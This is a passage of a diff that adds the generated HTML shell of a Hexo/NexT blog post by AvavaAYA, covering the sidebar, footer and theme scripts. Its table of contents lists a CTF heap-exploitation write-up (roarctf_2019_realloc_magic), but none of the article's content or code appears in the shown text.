+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#roarctf-2019-realloc-magic"><span class="nav-number">2.1.</span> <span class="nav-text">roarctf_2019_realloc_magic</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">2.1.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.1.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-py"><span class="nav-number">2.1.3.</span> <span class="nav-text">exp.py</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="AvavaAYA"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">AvavaAYA</p>
+  <div class="site-description" itemprop="description">在看吗, 在看的话就给你一拳</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/AvavaAYA" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;AvavaAYA" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://space.bilibili.com/243659703" title="Bilibili → https:&#x2F;&#x2F;space.bilibili.com&#x2F;243659703" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-facebook fa-fw"></i>Bilibili</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 114514 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">AvavaAYA</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">62k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">57 分钟</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
